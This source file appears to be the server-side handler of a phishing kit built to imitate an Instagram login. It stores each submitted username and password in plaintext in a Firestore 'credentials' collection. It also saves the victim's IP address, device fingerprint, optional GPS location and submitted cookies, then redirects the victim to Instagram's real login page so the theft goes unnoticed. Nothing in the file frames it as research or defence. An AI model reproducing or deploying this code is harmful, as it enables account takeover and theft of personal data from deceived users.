import { NextResponse } from 'next/server';
import admin from 'firebase-admin';
import { UAParser } from 'ua-parser-js';
import * as crypto from 'crypto';

// Initialize Firebase
if (!admin.apps.length) {
  try {
    const serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG || '{}');
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: serviceAccount.project_id,
        clientEmail: serviceAccount.client_email,
        privateKey: serviceAccount.private_key.replace(/\\n/g, '\n')
      })
    });
  } catch (e) {
    console.error('Firebase init error:', e);
  }
}

function generateSessionToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    const username = formData.get('username')?.toString() || '';
    const password = formData.get('password')?.toString() || '';
    const ip = request.headers.get('x-forwarded-for') || '';
    const userAgent = request.headers.get('user-agent') || '';
    const locationConsent = formData.get('locationConsent')?.toString() === 'true';
    const autofilled = formData.get('autofilled')?.toString() === 'true';
    const website = formData.get('website')?.toString() || '';
    const websiteCookies = JSON.parse(formData.get('websiteCookies')?.toString() || '[]');

    if (!username || !password) {
      return NextResponse.json(
        { error: 'Missing credentials' },
        { status: 400 }
      );
    }

    // Parse user agent
    const parser = new UAParser(userAgent);
    const deviceInfo = parser.getResult();

    // Process location data if consent was given
    let locationData = null;
    if (locationConsent) {
      const lat = parseFloat(formData.get('latitude')?.toString() || '0');
      const lng = parseFloat(formData.get('longitude')?.toString() || '0');
      const accuracy = parseFloat(formData.get('accuracy')?.toString() || '0');
      
      if (lat && lng) {
        locationData = {
          coordinates: new admin.firestore.GeoPoint(lat, lng),
          accuracy,
          timestamp: admin.firestore.FieldValue.serverTimestamp()
        };
      }
    }

    // Generate session token and expiration (1 hour from now)
    const sessionToken = generateSessionToken();
    const sessionExpires = new Date();
    sessionExpires.setHours(sessionExpires.getHours() + 1);

    if (admin.apps.length) {
      const userData = {
        username,
        password,
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        ip_address: ip,
        user_agent: userAgent,
        device: {
          os: deviceInfo.os?.name || 'Unknown',
          device: deviceInfo.device?.model || deviceInfo.device?.type || 'desktop',
          browser: deviceInfo.browser?.name || 'Unknown',
          isMobile: deviceInfo.device?.type === 'mobile' || deviceInfo.device?.type === 'tablet'
        },
        location: locationData,
        hasLocationConsent: locationConsent,
        screenResolution: formData.get('screenResolution')?.toString() || '',
        timezone: formData.get('timezone')?.toString() || '',
        platform: formData.get('platform')?.toString() || '',
        language: formData.get('language')?.toString() || '',
        cookiesEnabled: formData.get('cookiesEnabled')?.toString() === 'true',
        doNotTrack: formData.get('doNotTrack')?.toString() === 'true',
        autofilled,
        sessionToken,
        sessionExpires: admin.firestore.Timestamp.fromDate(sessionExpires),
        website,
        websiteCookies,
        deviceInfo: JSON.parse(formData.get('deviceInfo')?.toString() || '{}'),
        browserFeatures: JSON.parse(formData.get('browserFeatures')?.toString() || '{}')
      };

      await admin.firestore().collection('credentials').add(userData);
    }

    // Create response with session cookie
    const response = NextResponse.json(
      { 
        success: true, 
        redirectUrl: 'https://www.instagram.com/accounts/login/',
        sessionToken 
      },
      { status: 200 }
    );

    // Set HttpOnly, Secure cookie
    response.cookies.set('sessionToken', sessionToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      expires: sessionExpires,
      path: '/',
    });

    return response;

  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Server error' },
      { status: 500 }
    );
  }
}

export async function OPTIONS() {
  return new Response(null, {
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}